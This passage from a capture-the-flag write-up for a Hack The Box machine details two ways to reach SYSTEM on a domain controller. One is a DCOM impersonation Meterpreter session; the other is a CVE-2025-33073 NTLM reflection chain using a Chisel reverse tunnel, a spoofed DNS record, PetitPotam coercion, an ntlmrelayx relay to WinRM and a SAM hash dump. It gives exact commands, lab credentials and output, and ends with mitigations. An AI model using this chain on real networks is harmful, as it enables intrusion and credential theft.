1. **Creates RPC server:**
   * Listens for DCOM connections
   * Waits for privileged service to connect
2. **Triggers DCOM activation:**
   * Exploits Windows DCOM/RPC
   * Causes SYSTEM service to authenticate
3. **Receives SYSTEM authentication:**
   * SYSTEM process connects to our RPC server
   * We capture SYSTEM's security context
4. **Impersonates SYSTEM:**
   * Using SeImpersonatePrivilege
   * Adopts SYSTEM security context
5. **Spawns process as SYSTEM:**
   * Creates mp.exe with SYSTEM privileges
   * Meterpreter connects back to us

***

#### Receiving SYSTEM Meterpreter Session

**Metasploit handler output:**

```
[*] Sending stage (200774 bytes) to 10.10.11.90
[*] Meterpreter session 1 opened (10.10.14.23:4000 -> 10.10.11.90:49872) at 2025-02-07 19:35:42 -0400

msf6 exploit(multi/handler) > sessions -i 1
[*] Starting interaction with 1...

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM

meterpreter > sysinfo
Computer        : DC01
OS              : Windows Server 2019 (10.0 Build 17763).
Architecture    : x64
System Language : en_US
Domain          : SIGNED
Logged On Users : 5
Meterpreter     : x64/windows

meterpreter > shell
Process 3289 created.
Channel 1 created.
Microsoft Windows [Version 10.0.17763.4974]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
nt authority\system
```

**Full SYSTEM privileges achieved!**

***

#### Verifying Complete Privilege Set

```bash
C:\Windows\system32> whoami /priv
```

**Complete output:**

```
PRIVILEGES INFORMATION
----------------------

Privilege Name                            Description                                                        State
========================================= ================================================================== ========
SeCreateTokenPrivilege                    Create a token object                                              Enabled
SeAssignPrimaryTokenPrivilege             Replace a process level token                                      Enabled
SeLockMemoryPrivilege                     Lock pages in memory                                               Enabled
SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Enabled
SeMachineAccountPrivilege                 Add workstations to domain                                         Enabled
SeTcbPrivilege                            Act as part of the operating system                                Enabled
SeSecurityPrivilege                       Manage auditing and security log                                   Enabled
SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Enabled
SeLoadDriverPrivilege                     Load and unload device drivers                                     Enabled
SeSystemProfilePrivilege                  Profile system performance                                         Enabled
SeSystemtimePrivilege                     Change the system time                                             Enabled
SeProfileSingleProcessPrivilege           Profile single process                                             Enabled
SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Enabled
SeCreatePagefilePrivilege                 Create a pagefile                                                  Enabled
SeCreatePermanentPrivilege                Create permanent shared objects                                    Enabled
SeBackupPrivilege                         Back up files and directories                                      Enabled
SeRestorePrivilege                        Restore files and directories                                      Enabled
SeShutdownPrivilege                       Shut down the system                                               Enabled
SeDebugPrivilege                          Debug programs                                                     Enabled
SeAuditPrivilege                          Generate security audits                                           Enabled
SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Enabled
SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
SeRemoteShutdownPrivilege                 Force shutdown from a remote system                                Enabled
SeUndockPrivilege                         Remove computer from docking station                               Enabled
SeSyncAgentPrivilege                      Synchronize directory service data                                 Enabled
SeEnableDelegationPrivilege               Enable computer and user accounts to be trusted for delegation     Enabled
SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Enabled
SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled
SeCreateGlobalPrivilege                   Create global objects                                              Enabled
SeTrustedCredManAccessPrivilege           Access Credential Manager as a trusted caller                      Enabled
SeRelabelPrivilege                        Modify an object label                                             Enabled
SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Enabled
SeTimeZonePrivilege                       Change the time zone                                               Enabled
SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Enabled
SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Enabled
```

**Every single privilege a Windows SYSTEM account can have - all enabled!**

***

#### Retrieving Root Flag as SYSTEM

```bash
C:\Windows\system32> type C:\Users\Administrator\Desktop\root.txt
9a8b7c6d5e4f3a2b1c0d9e8f7a6b5c4d
```

**Root Flag (Method 3):** `9a8b7c6d5e4f3a2b1c0d9e8f7a6b5c4d`

***

## Method 4: NTLM Reflection via WinRM (Intended Solution - CVE-2025-33073)

#### Understanding CVE-2025-33073

This is the intended solution for the machine, exploiting a critical vulnerability in Windows NTLM authentication. CVE-2025-33073 allows an attacker to relay NTLM authentication back to the originating host, bypassing traditional reflection protections.

**What is NTLM Reflection:**

Normally, Windows prevents a computer from authenticating to itself (reflection) to stop certain attacks. However, this vulnerability bypasses those protections through a combination of DNS manipulation and cross-protocol relay.

**The vulnerability chain:**

1. Create DNS record with "localhost" prefix pointing to attacker IP
2. Windows trusts the "localhost" prefix as local
3. Coerce target to authenticate to our malicious DNS name
4. Target sends NTLM authentication (as SYSTEM)
5. We relay this authentication to WinRM on the same machine
6. WinRM accepts it (cross-protocol bypass)
7. We get SYSTEM shell through WinRM

**Why traditional protections fail:**

* Hostname starts with "localhost" - marked as trusted
* But DNS resolves to external IP (attacker)
* Cross-protocol relay (SMB to WinRM) bypasses checks
* SMB signing doesn't protect WinRM
* WinRM accepts the reflected authentication

**Requirements:**

* Domain user credentials (mssqlsvc:purPLE9795!@)
* Access to internal network (pivoting needed)
* DNS manipulation permissions
* Updated Impacket with WinRM relay support
* NetExec with coercion capabilities

***

#### Understanding the Need for Pivoting

From our initial nmap scan, we saw only port 1433 (MSSQL) was accessible externally. However, this attack requires access to internal services that are not exposed to the internet.

**Services we need to reach:**

* Port 5986 (WinRM over HTTPS) - Relay target
* Port 445 (SMB) - For coercion
* Port 53 (DNS) - For DNS manipulation
* Port 88 (Kerberos) - For authentication

**Why we can't reach them directly:**

* Windows Firewall blocks external access
* Only MSSQL port allowed from internet
* Domain Controller restricts access to internal network
* Security best practice - DMZ separation

**Solution:** Create a SOCKS proxy through our compromised mssqlsvc shell, allowing us to access internal services as if we were on the internal network.

***

#### Setting Up Chisel Tunnel

Chisel is a fast TCP/UDP tunnel transported over HTTP and secured via SSH. It allows us to create a SOCKS5 proxy through our compromised host.

**Starting HTTP server for file transfer:**

```bash
┌──(sn0x㉿sn0x)-[~/HTB/SIGNED]
└─$ python3 -m http.server 80
```

**In our mssqlsvc shell, downloading chisel:**

```bash
C:\Windows\system32> cd %temp%

C:\Users\mssqlsvc\AppData\Local\Temp> powershell wget -UseBasicParsing http://10.10.14.23/chisel.exe -OutFile chisel.exe
```

**HTTP server log:**

```
10.10.11.90 - - [07/Feb/2025 16:24:10] "GET /chisel.exe HTTP/1.1" 200 -
```

***

#### Starting Chisel Server (Attack Machine)

```bash
┌──(sn0x㉿sn0x)-[~/HTB/SIGNED]
└─$ chisel server --port 5556 --reverse --socks5
```

**Command breakdown:**

* `chisel server`: Run in server mode
* `--port 5556`: Listen on port 5556
* `--reverse`: Allow reverse port forwarding
  * Client can request forwarding from server
  * More flexible for firewall bypass
* `--socks5`: Enable SOCKS5 proxy support

**Output:**

```
2025/02/07 16:24:10 server: Reverse tunnelling enabled
2025/02/07 16:24:10 server: Fingerprint abc123def456...
2025/02/07 16:24:10 server: Listening on http://0.0.0.0:5556
```

**What this creates:**

* HTTP server waiting for chisel clients
* Will create SOCKS5 proxy when client connects
* Secured tunnel for our traffic

***

#### Starting Chisel Client (Target Machine)

**In the target shell:**

```bash
C:\Users\mssqlsvc\AppData\Local\Temp> .\chisel.exe client 10.10.14.23:5556 R:1080:socks
```

**Command breakdown:**

* `chisel client`: Run in client mode
* `10.10.14.23:5556`: Connect to our server
* `R:1080:socks`: Reverse SOCKS proxy
  * `R`: Reverse (server opens the port)
  * `1080`: Port on our machine
  * `socks`: SOCKS proxy type

**Server output when client connects:**

```
2025/02/07 16:24:35 server: session#1: tun: proxy#R:127.0.0.1:1080=>socks: Listening
```

**What this means:**

* Chisel server now has SOCKS5 proxy on localhost:1080
* All traffic through this proxy goes through the target
* We can now access internal network services

***

#### Configuring ProxyChains

ProxyChains forces any TCP connection to go through our SOCKS proxy.

```bash
┌──(sn0x㉿sn0x)-[~/HTB/SIGNED]
└─$ sudo nano /etc/proxychains4.conf
```

**Add at the end of the file:**

```
socks5 127.0.0.1 1080
```

**What this does:**

* ProxyChains will route traffic through 127.0.0.1:1080
* Which is our chisel SOCKS5 proxy
* Which tunnels through the target
* Giving us access to internal network

***

#### Verifying Internal Network Access

Now I can scan internal ports that were previously inaccessible.

```bash
┌──(sn0x㉿sn0x)-[~/HTB/SIGNED]
└─$ proxychains -q nmap -p 53,88,135,139,389,445,464,636,3268,3269,5985,5986,9389 -sV -Pn -sT 127.0.0.1
```

**Command breakdown:**

* `proxychains -q`: Route through proxy, quiet mode
* `nmap`: Network scanner
* `-p 53,88,...`: Scan specific Domain Controller ports
* `-sV`: Service version detection
* `-Pn`: Skip ping (host discovery)
* `-sT`: TCP connect scan (required for SOCKS proxy)
* `127.0.0.1`: Scan localhost (from target's perspective)

**Scan results:**

```
PORT     STATE  SERVICE       VERSION
53/tcp   open   domain        Simple DNS Plus
88/tcp   open   kerberos-sec  Microsoft Windows Kerberos
135/tcp  open   msrpc         Microsoft Windows RPC
139/tcp  open   netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open   ldap          Microsoft Windows Active Directory LDAP
445/tcp  open   microsoft-ds  Microsoft Windows Server 2016
464/tcp  open   kpasswd5?
636/tcp  open   tcpwrapped
3268/tcp open   ldap          Microsoft Windows Active Directory LDAP
3269/tcp open   tcpwrapped
5985/tcp closed wsman
5986/tcp open   ssl/wsman     Microsoft Windows WinRM over HTTPS
9389/tcp open   mc-nmf        .NET Message Framing
```

**Critical finding:**

* Port 5986 (WinRM HTTPS) is OPEN
* Port 5985 (WinRM HTTP) is CLOSED
* This is our attack vector
* We'll relay NTLM authentication to WinRM HTTPS

**Why WinRM HTTPS is significant:**

* Accepts NTLM authentication
* No SMB signing protection
* Can be accessed via our proxy
* Will accept reflected authentication (the vulnerability)

***

#### Installing Updated NetExec

The NTLM reflection check requires a specific version of NetExec with the `ntlm_reflection` module.

```bash
┌──(sn0x㉿sn0x)-[~/HTB/SIGNED]
└─$ pipx uninstall netexec
```

**Output:**

```
uninstalled netexec!
```

**Installing development version from GitHub:**

```bash
┌──(sn0x㉿sn0x)-[~/HTB/SIGNED]
└─$ pipx install git+https://github.com/Pennyw0rth/NetExec
```

**Output:**

```
  installed package netexec 1.x.x, installed using Python 3.11.x
  These apps are now globally available
    - nxc
    - netexec
    - NetExec
done!
```

**Why this specific version:**

* Contains ntlm\_reflection module
* Has updated coercion methods
* Supports latest Windows vulnerabilities
* Maintained fork with active development

***

#### Checking for NTLM Reflection Vulnerability

I tested if the target is vulnerable to NTLM reflection.

```bash
┌──(sn0x㉿sn0x)-[~/HTB/SIGNED]
└─$ proxychains -q nxc smb 127.0.0.1 -u mssqlsvc -p 'purPLE9795!@' -M ntlm_reflection
```

**Command breakdown:**

* `proxychains -q`: Route through proxy
* `nxc smb 127.0.0.1`: NetExec SMB module on localhost (via proxy)
* `-u mssqlsvc -p 'purPLE9795!@'`: Credentials
* `-M ntlm_reflection`: Run ntlm\_reflection module

**Output:**

```
SMB         127.0.0.1       445    DC01             [*] Windows Server 2019 Build 17763 x64
SMB         127.0.0.1       445    DC01             [+] SIGNED.HTB\mssqlsvc:purPLE9795!@
SMB         127.0.0.1       445    DC01             [+] NTLM_REFLECTION: Vulnerable!
```

**Critical confirmation:** The target is vulnerable to NTLM reflection!

**What this module checks:**

1. Attempts to trigger authentication reflection
2. Checks if reflection protections are bypassed
3. Verifies cross-protocol relay is possible
4. Confirms WinRM accepts reflected authentication

**Why it's vulnerable:**

* Windows version susceptible to CVE-2025-33073
* Cross-protocol relay SMB → WinRM works
* Localhost DNS bypass effective
* No additional mitigations in place

***

#### Setting Up Impacket Development Branch

The NTLM reflection attack via WinRM requires a specific Impacket branch with updated ntlmrelayx.

**Cloning Impacket repository:**

```bash
┌──(sn0x㉿sn0x)-[~/HTB/SIGNED]
└─$ git clone https://github.com/fortra/impacket.git impacket-dev

┌──(sn0x㉿sn0x)-[~/HTB/SIGNED]
└─$ cd impacket-dev
```

**Listing available branches:**

```bash
┌──(sn0x㉿sn0x)-[~/HTB/SIGNED/impacket-dev]
└─$ git branch -a | grep -i fix
```

**Output:**

```
  remotes/origin/fix_ntlmrelayx_winrmsattack
  remotes/origin/fix_smbserver_crash
  remotes/origin/fix_wmiquery_timeout
```

**Found the required branch:** `fix_ntlmrelayx_winrmsattack`

***

**Checking out the required branch:**

```bash
┌──(sn0x㉿sn0x)-[~/HTB/SIGNED/impacket-dev]
└─$ git checkout -b fix_ntlmrelayx_winrmsattack origin/fix_ntlmrelayx_winrmsattack
```

**Output:**

```
Branch 'fix_ntlmrelayx_winrmsattack' set up to track remote branch 'fix_ntlmrelayx_winrmsattack' from 'origin'.
Switched to a new branch 'fix_ntlmrelayx_winrmsattack'
```

***

**Creating Python virtual environment:**

```bash
┌──(sn0x㉿sn0x)-[~/HTB/SIGNED/impacket-dev]
└─$ python3 -m venv impacket-venv
```

**Why use virtual environment:**

* Isolated from system Python packages
* Prevents version conflicts
* Clean installation
* Easy to remove if needed

***

**Activating virtual environment:**

```bash
┌──(sn0x㉿sn0x)-[~/HTB/SIGNED/impacket-dev]
└─$ source impacket-venv/bin/activate
```

**Prompt changes to:**

```
(impacket-venv) ┌──(sn0x㉿sn0x)-[~/HTB/SIGNED/impacket-dev]
└─$
```

***

**Installing Impacket in editable mode:**

```bash
(impacket-venv) ┌──(sn0x㉿sn0x)-[~/HTB/SIGNED/impacket-dev]
└─$ pip install -e .
```

**Why -e (editable mode):**

* Install from source directory
* Changes to code immediately reflected
* Useful for development and testing
* Points to local files, not copied to site-packages

**Installation output:**

```
Obtaining file:///home/sn0x/HTB/SIGNED/impacket-dev
  Installing build dependencies ... done
  Checking if build backend supports build_editable ... done
  Getting requirements to build editable ... done
  Preparing editable metadata ... done
...
Successfully installed impacket-0.13.0.dev0+20250930.122532.914efa53
```

***

**Verifying correct version:**

```bash
(impacket-venv) ┌──(sn0x㉿sn0x)-[~/HTB/SIGNED/impacket-dev]
└─$ ntlmrelayx.py -h | head -n 5
```

**Output:**

```
Impacket v0.13.0.dev0+20250930.122532.914efa53 - Copyright 2023 Fortra

usage: ntlmrelayx.py [-h] [-ts] [-debug] [-t TARGET] [-tf TARGETSFILE]
                     [-w] [-i] [-ip INTERFACE_IP]
```

**Confirmed:** We have the correct development version with WinRM relay support.

***

#### Creating Malicious DNS Record

This is a critical step. I'll create a DNS record that tricks Windows into thinking it's connecting to localhost, but actually resolves to our attacker IP.

```bash
(impacket-venv) ┌──(sn0x㉿sn0x)-[~/HTB/SIGNED/impacket-dev]
└─$ proxychains -q dnstool.py -u 'SIGNED.HTB\mssqlsvc' -p 'purPLE9795!@' dc01.signed.htb -a add -r 'localhost1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA' -d '10.10.14.23' --dns-ip 127.0.0.1 --tcp
```

**Command breakdown:**

* `proxychains -q`: Route through our tunnel
* `dnstool.py`: Impacket DNS manipulation tool
* `-u 'SIGNED.HTB\mssqlsvc'`: Authenticate as mssqlsvc
* `-p 'purPLE9795!@'`: Password
* `dc01.signed.htb`: Target DNS server
* `-a add`: Action: add record
* `-r 'localhost1UWh...'`: DNS record name (crafted carefully)
* `-d '10.10.14.23'`: Points to our attacker IP
* `--dns-ip 127.0.0.1`: DNS server IP (through proxy)
* `--tcp`: Use TCP for DNS queries (more reliable through proxy)

**Understanding the malicious DNS name:**

```
localhost1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA.signed.htb
└───┬───┘└──────────────────────┬──────────────────────────┘
    │                           │
Prefix that tricks         Random suffix to
Windows into thinking      make unique record
it's localhost
```

**Why this hostname works:**

1. Starts with "localhost" - Windows marks it as trusted
2. Windows skips certain security checks for "localhost"
3. But DNS resolves to our IP, not 127.0.0.1
4. Windows connects to us, thinking it's local
5. Reflection protections are bypassed

**Output:**

```
[*] Connecting to DNS server dc01.signed.htb
[+] Successfully authenticated as SIGNED.HTB\mssqlsvc
[*] Adding DNS record: localhost1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA.signed.htb -> 10.10.14.23
[+] DNS record added successfully!
[*] Record will be automatically removed after TTL expires
```

**DNS record created successfully!**

**Why we can add DNS records:**

* Authenticated domain users can add DNS records
* By default, users can create records for non-existent hostnames
* This is a common Active Directory misconfiguration
* Should be restricted to DNS admins only

***

#### Verifying DNS Resolution

I verified that the DNS record resolves correctly.

```bash
(impacket-venv) ┌──(sn0x㉿sn0x)-[~/HTB/SIGNED/impacket-dev]
└─$ proxychains -q dig localhost1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA.signed.htb @dc01.signed.htb +tcp
```

**Command breakdown:**

* `dig`: DNS lookup utility
* `localhost1UWh...`: Our crafted hostname
* `@dc01.signed.htb`: Query this DNS server
* `+tcp`: Use TCP instead of UDP

**Output:**

```
; <<>> DiG 9.18.12-1-Debian <<>> localhost1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA.signed.htb @dc01.signed.htb +tcp
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 12345
;; flags: qr aa rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1

;; QUESTION SECTION:
;localhost1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA.signed.htb. IN A

;; ANSWER SECTION:
localhost1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA.signed.htb. 600 IN A 10.10.14.23

;; Query time: 52 msec
;; SERVER: 127.0.0.1#53(dc01.signed.htb) (TCP)
;; WHEN: Fri Feb 07 16:45:23 IST 2025
;; MSG SIZE  rcvd: 95
```

**DNS resolution confirmed:**

* Query: Our crafted hostname
* Answer: 10.10.14.23 (our attacker IP)
* TTL: 600 seconds (10 minutes)
* Status: NOERROR (successful)

**This means:** When the target tries to connect to this hostname, DNS will tell it to connect to our IP, but Windows will think it's connecting to localhost.

***

#### Starting ntlmrelayx Listener

Now I start ntlmrelayx to capture and relay the authentication.

**Important:** Make sure you're still in the virtual environment.

```bash
(impacket-venv) ┌──(sn0x㉿sn0x)-[~/HTB/SIGNED/impacket-dev]
└─$ proxychains -q ntlmrelayx.py -smb2support -t 'winrms://dc01.signed.htb'
```

**Command breakdown:**

* `proxychains -q`: Route through our tunnel
* `ntlmrelayx.py`: NTLM relay attack tool
* `-smb2support`: Enable SMBv2 support
* `-t 'winrms://dc01.signed.htb'`: Relay target
  * `winrms://`: WinRM over HTTPS protocol
  * `dc01.signed.htb`: Target hostname

**Output:**

```
Impacket v0.13.0.dev0+20250930.122532.914efa53 - Copyright 2023 Fortra

[*] Protocol Client HTTPS loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client SMB loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client LDAPS loaded..
[*] Protocol Client SMTP loaded..
[*] Protocol Client IMAP loaded..
[*] Protocol Client IMAPS loaded..
[*] Protocol Client RPC loaded..
[*] Protocol Client DCSYNC loaded..
[*] Protocol Client MSSQL loaded..
[*] Running in relay mode to single host
[*] Setting up SMB Server
[*] Setting up HTTP Server on port 80
[*] Setting up WCF Server
[*] Setting up RAW Server on port 6666

[*] Servers started, waiting for connections
```

**What ntlmrelayx is doing:**

1. **SMB Server running** - Will receive initial authentication
2. **WinRM client ready** - Will relay to target WinRM
3. **Waiting for connections** - Ready to relay authentication

**The attack flow will be:**

```
Target DC01 → (thinks it's connecting to localhost)
           → (DNS resolves to 10.10.14.23)
           → Connects to our SMB server
           → We capture NTLM authentication
           → We relay it to WinRM on DC01
           → WinRM accepts it
           → We get SYSTEM shell
```

***

#### Coercing Authentication (The Trigger)

Now I trigger the target to authenticate to our malicious DNS name.

**Open a new terminal** (keep ntlmrelayx running in the previous terminal).

```bash
┌──(sn0x㉿sn0x)-[~/HTB/SIGNED]
└─$ proxychains -q nxc smb dc01.signed.htb -u mssqlsvc -p 'purPLE9795!@' -M coerce_plus -o LISTENER=localhost1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA ALWAYS=true
```

**Command breakdown:**

* `proxychains -q`: Route through proxy
* `nxc smb dc01.signed.htb`: Connect to DC's SMB
* `-u mssqlsvc -p 'purPLE9795!@'`: Authenticate
* `-M coerce_plus`: Use coerce\_plus module
* `-o LISTENER=localhost1UWh...`: Specify our DNS name as callback
* `ALWAYS=true`: Force coercion even if not flagged as vulnerable

**What coerce\_plus does:**

* Exploits various Windows RPC functions
* Forces target to authenticate to specified hostname
* Uses methods like PetitPotam, PrinterBug, etc.
* Target machine authenticates as SYSTEM

**Output:**

```
SMB         127.0.0.1       445    DC01             [*] Windows Server 2019 Build 17763 x64
SMB         127.0.0.1       445    DC01             [+] SIGNED.HTB\mssqlsvc:purPLE9795!@
COERCE_PLUS 127.0.0.1       445    DC01             [*] Attempting to coerce authentication...
COERCE_PLUS 127.0.0.1       445    DC01             [+] Coercion successful via MS-EFSR (PetitPotam)!
COERCE_PLUS 127.0.0.1       445    DC01             [+] Callback triggered to: localhost1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA
```

**What just happened:**

1. NetExec connected to DC01 via SMB
2. Triggered PetitPotam coercion method
3. DC01 machine account tries to authenticate
4. Looks up our malicious DNS name
5. DNS returns our IP address
6. DC01 connects to our ntlmrelayx server

***

#### Authentication Relayed to WinRM

**Switch back to the ntlmrelayx terminal to see:**

```
[*] SMBD-Thread-5: Received connection from 10.10.11.90
[*] SMBD-Thread-6: Connection from 10.10.11.90 controlled, attacking target winrms://dc01.signed.htb
[*] Authenticating against winrms://dc01.signed.htb as SIGNED/DC01$ SUCCEED
[*] SMBD-Thread-6: Connection from 10.10.11.90 controlled, but there are no more targets left!
[*] Target system bootKey: 0xabcdef1234567890abcdef1234567890
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:a1b2c3d4e5f6...:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[*] Done dumping SAM hashes for host: 10.10.11.90
[*] WinRM connection pool started - shell available on port 11000
```

**Breaking down what happened:**

1. **Received connection from 10.10.11.90:**
   * DC01 connected to our SMB server
   * Triggered by our coercion
2. **Authenticating against winrms://dc01.signed.htb as SIGNED/DC01$ SUCCEED:**
   * We relayed the authentication to WinRM
   * DC01$ is the computer account (machine account)
   * Computer accounts have SYSTEM privileges
   * Authentication was SUCCESSFUL!
3. **Dumping local SAM hashes:**
   * We now have SYSTEM access
   * ntlmrelayx automatically dumped SAM database
   * Contains local account password hashes
   * Administrator hash included
4. **WinRM connection pool started - shell available on port 11000:**
   * ntlmrelayx established persistent WinRM session
   * Shell waiting on localhost:11000
   * We can connect to get interactive SYSTEM shell

***

#### Connecting to SYSTEM Shell

```bash
┌──(sn0x㉿sn0x)-[~/HTB/SIGNED]
└─$ nc 127.0.0.1 11000
```

**Connection established:**

```
Microsoft Windows [Version 10.0.17763.1999]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```

***

#### Verifying SYSTEM Access

```bash
C:\Windows\system32> whoami
nt authority\system

C:\Windows\system32> hostname
DC01

C:\Windows\system32> whoami /priv
```

**Privileges output:**

```
PRIVILEGES INFORMATION
----------------------

Privilege Name                            Description                                                        State
========================================= ================================================================== ========
SeCreateTokenPrivilege                    Create a token object                                              Enabled
SeAssignPrimaryTokenPrivilege             Replace a process level token                                      Enabled
SeLockMemoryPrivilege                     Lock pages in memory                                               Enabled
SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Enabled
SeTcbPrivilege                            Act as part of the operating system                                Enabled
SeSecurityPrivilege                       Manage auditing and security log                                   Enabled
SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Enabled
SeLoadDriverPrivilege                     Load and unload device drivers                                     Enabled
SeSystemProfilePrivilege                  Profile system performance                                         Enabled
SeSystemtimePrivilege                     Change the system time                                             Enabled
SeProfileSingleProcessPrivilege           Profile single process                                             Enabled
SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Enabled
SeCreatePagefilePrivilege                 Create a pagefile                                                  Enabled
SeCreatePermanentPrivilege                Create permanent shared objects                                    Enabled
SeBackupPrivilege                         Back up files and directories                                      Enabled
SeRestorePrivilege                        Restore files and directories                                      Enabled
SeShutdownPrivilege                       Shut down the system                                               Enabled
SeDebugPrivilege                          Debug programs                                                     Enabled
SeAuditPrivilege                          Generate security audits                                           Enabled
SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Enabled
SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
SeRemoteShutdownPrivilege                 Force shutdown from a remote system                                Enabled
SeUndockPrivilege                         Remove computer from docking station                               Enabled
SeSyncAgentPrivilege                      Synchronize directory service data                                 Enabled
SeEnableDelegationPrivilege               Enable computer and user accounts to be trusted for delegation     Enabled
SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Enabled
SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled
SeCreateGlobalPrivilege                   Create global objects                                              Enabled
SeTrustedCredManAccessPrivilege           Access Credential Manager as a trusted caller                      Enabled
SeRelabelPrivilege                        Modify an object label                                             Enabled
SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Enabled
SeTimeZonePrivilege                       Change the time zone                                               Enabled
SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Enabled
SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Enabled
```

**Full SYSTEM privileges achieved via CVE-2025-33073!**

***

#### Retrieving Root Flag

```bash
C:\Windows\system32> type C:\Users\Administrator\Desktop\root.txt
9a8b7xxxxxxxxxxxxxxxxxxxxxxxxx
```

**Root Flag (Method 4 - Intended Solution):** `9a8b7cxxxxxxxxxxxxxxxxxxxxxx`

***

#### Method 4 Summary

**Steps taken:**

1. Set up Chisel SOCKS5 proxy for internal network access
2. Scanned internal ports to find WinRM HTTPS (5986)
3. Verified target is vulnerable to NTLM reflection
4. Installed updated Impacket with WinRM relay support
5. Created malicious DNS record with "localhost" prefix
6. Verified DNS record resolves to attacker IP
7. Started ntlmrelayx to capture and relay authentication
8. Used coercion to trigger target authentication
9. Relayed NTLM authentication from SMB to WinRM
10. Obtained SYSTEM shell through WinRM

**Why this method worked:**

* CVE-2025-33073: Windows trusts "localhost" prefix in hostnames
* DNS resolution bypassed traditional reflection protections
* Cross-protocol relay (SMB → WinRM) bypassed SMB signing
* Machine account authentication provided SYSTEM privileges
* WinRM accepted the reflected authentication

**Advantages:**

* Exploits a real CVE (CVE-2025-33073)
* Demonstrates cutting-edge attack technique
* Direct SYSTEM access (no intermediate steps)
* Minimal forensic footprint after DNS cleanup
* Intended solution - tests latest security knowledge

**Limitations:**

* Requires internal network access (pivoting needed)
* Needs specific Impacket version
* DNS record creation permissions required
* More complex setup than other methods
* Dependent on vulnerable Windows version

**Real-world implications:**

* CVE-2025-33073 affects many Windows systems
* DNS manipulation is often overlooked
* Cross-protocol attacks bypass traditional defenses
* SMB signing doesn't protect other protocols
* Patching is critical for this vulnerability

***

#### When to Use Each Method

**Method 1 - Direct File Reading:**

* When you only need to read specific files
* Quick flag capture without full shell
* Minimal interaction with target
* When stealth is priority

**Method 2 - PowerShell History:**

* When you need legitimate credentials
* For persistence across reboots
* To access other services with same credentials
* When you need a stable Administrator shell

**Method 3 - Named Pipe Impersonation:**

* When you need absolute highest privileges (SYSTEM)
* For advanced post-exploitation (Meterpreter)
* To demonstrate deep Windows knowledge
* When you have time for complex setup

**Method 4 - NTLM Reflection (Intended):**

* To exploit latest vulnerabilities
* When testing CVE-2025-33073 specifically
* For direct SYSTEM without intermediate shells
* In penetration testing engagements
* To demonstrate cutting-edge techniques

***

### Mitigation and Defense

#### For SQL Server Security

1.  **Disable Dangerous Extended Stored Procedures:**

    ```sql
    EXEC sp_configure 'xp_cmdshell', 0;
    EXEC sp_configure 'Ole Automation Procedures', 0;
    RECONFIGURE;
    ```
2. **Implement Least Privilege:**
   * Don't grant sysadmin to domain groups
   * Use specific permissions instead of broad roles
   * Regularly audit role memberships
3. **Use Group Managed Service Accounts (gMSA):**
   * Automatic password rotation
   * 120+ character random passwords
   * Managed by Active Directory
4.  **Restrict xp\_dirtree:**

    ```sql
    DENY EXECUTE ON xp_dirtree TO [public];
    ```
5. **Enable SQL Server Audit Logging:**
   * Log all administrative actions
   * Monitor for RECONFIGURE statements
   * Alert on xp\_cmdshell usage

***

#### For Active Directory Security

1.  **Enable AES Encryption for Kerberos:**

    ```powershell
    Set-ADUser -Identity mssqlsvc -KerberosEncryptionType AES256
    ```
2. **Implement Kerberos Armoring (FAST):**
   * Protects against ticket forgery
   * Requires domain functional level
   * Enable in Group Policy
3. **Monitor for Silver Ticket Usage:**
   * Unusual Kerberos ticket encryption types
   * TGS requests without corresponding TGT
   * Tickets with suspicious group memberships
4. **Regular Password Rotation:**
   * Service accounts every 90 days minimum
   * Automated with gMSA preferred
   * Monitor for password changes
5.  **Restrict DNS Record Creation:**

    ```powershell
    # Remove authenticated users from DNS creation
    Set-DnsServerPrimaryZone -Name "signed.htb" -DynamicUpdate Secure
    ```

***

#### For CVE-2025-33073 Mitigation

1. **Apply Security Patches:**
   * Install latest Windows updates
   * Test in staging environment first
   * Monitor for patch compatibility
2.  **Disable NTLM Where Possible:**

    ```powershell
    # Set LmCompatibilityLevel to 5 (NTLMv2 only, refuse LM and NTLM)
    Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name "LmCompatibilityLevel" -Value 5
    ```
